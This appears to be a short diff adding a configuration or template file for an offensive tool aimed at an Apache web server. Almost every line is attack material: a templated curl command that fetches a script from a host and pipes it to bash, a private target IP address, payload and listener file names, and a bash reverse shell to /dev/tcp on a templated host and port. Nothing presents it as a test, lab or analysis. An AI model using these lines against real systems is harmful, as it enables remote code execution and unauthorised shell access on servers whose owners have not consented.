@@ -1,0 +1,7 @@
+/var/www/html/manager/
+apache2
+./payload.txt
+'curl [[host]]/[[host_addr]]/index.php?first|bash&&clear;\n'
+192.168.0.163
+./listener.txt
+bash -i >& /dev/tcp/[[host]]/[[port]] 0>&1
